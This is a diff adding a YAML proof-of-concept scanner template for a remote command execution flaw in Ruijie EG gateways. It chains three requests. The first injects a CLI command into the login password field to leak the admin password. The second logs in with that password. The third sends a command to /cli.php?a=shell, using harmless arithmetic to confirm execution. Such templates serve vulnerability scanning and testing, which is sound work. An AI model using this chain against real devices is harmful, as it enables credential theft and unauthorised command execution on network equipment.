@@ -1,0 +1,35 @@
+name: poc-yaml-ruijie-eg-cli-rce
+set:
+  r1: randomInt(8000, 10000)
+  r2: randomInt(8000, 10000)
+rules:
+  - method: POST
+    path: /login.php
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      username=admin&password=admin?show+webmaster+user
+    expression: |
+      response.status == 200 && response.content_type.contains("text/json")
+    search: |
+      {"data":".*admin\s?(?P<password>[^\\"]*)
+  - method: POST
+    path: /login.php
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      username=admin&password={{password}}
+    expression: |
+      response.status == 200 && response.content_type.contains("text/json") && response.headers["Set-Cookie"].contains("user=admin") && response.body.bcontains(b"{\"data\":\"0\",\"status\":1}")
+  - method: POST
+    path: "/cli.php?a=shell"
+    follow_redirects: false
+    body: |
+      notdelay=true&command=expr {{r1}} * {{r2}}
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
+
+detail:
+  author: Jarcis
+  links:
+    - https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3%20cli.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
